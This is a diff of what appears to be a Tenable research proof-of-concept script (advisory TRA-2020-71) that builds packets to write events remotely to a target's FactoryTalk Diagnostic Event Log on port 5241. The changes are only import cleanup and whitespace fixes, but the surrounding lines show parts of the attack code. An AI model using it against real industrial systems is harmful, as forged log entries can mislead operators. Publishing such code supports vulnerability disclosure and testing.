@@ -6,8 +6,12 @@
 # Advisory: https://www.tenable.com/security/research/tra-2020-71
 ##
 
-import socket, argparse, struct
-import re, random, hexdump
+import argparse
+import socket
+import struct
+
+import hexdump
+
 
 def block(data, pad=False):
   dlen = len(data)
@@ -29,28 +33,28 @@ def wstr(s):
   ws = s.encode('utf_16_le') + b'\x00\x00'
   ws = struct.pack('<L', len(ws)) + ws
   return ws
-  
+
 def vt_str(s):
-   return struct.pack('<H',8) + wstr(s)   
+   return struct.pack('<H',8) + wstr(s)
 
 def vt_i4(i):
-  return struct.pack('<Hl',3, i)   
+  return struct.pack('<Hl',3, i)
 
 def vt_empty():
-  return b'\x00\x00\x02\x00\x00\x00\x00\x00\x00' 
+  return b'\x00\x00\x02\x00\x00\x00\x00\x00\x00'
 
 def field(name, w, val):
-  return wstr(name) + struct.pack('<L', w) + val 
- 
+  return wstr(name) + struct.pack('<L', w) + val
+
 def dump(title, data):
   print('[--- %s ---]' % (title))
   hexdump.hexdump(data)
 
 
 # MAIN
-# 
+#
 descr  = 'This script attempts to write an event to the FactoryTalk Diagnostic Event Log.'
- 
+
 parser = argparse.ArgumentParser(description=descr)
 parser.add_argument('host', help='Target host')
 parser.add_argument('-p', '--port', type=int, default=5241, help='Target port, default: %(default)s')
@@ -77,7 +81,7 @@ data += struct.pack('<L', 1)
 data += struct.pack('<L', 8)
 data += struct.pack('<L', 9)
 data += struct.pack('<L', 0)
-data += b'\x00' * 16 
+data += b'\x00' * 16
 data += struct.pack('<L', 2)
 
 vlist = []
@@ -100,7 +104,7 @@ data += struct.pack('<L', len(flist))
 for e in flist:
   data += e
 
-vt = vt_str('FULL_NAME') 
+vt = vt_str('FULL_NAME')
 data += vt
 
 data += struct.pack('<L', 0)
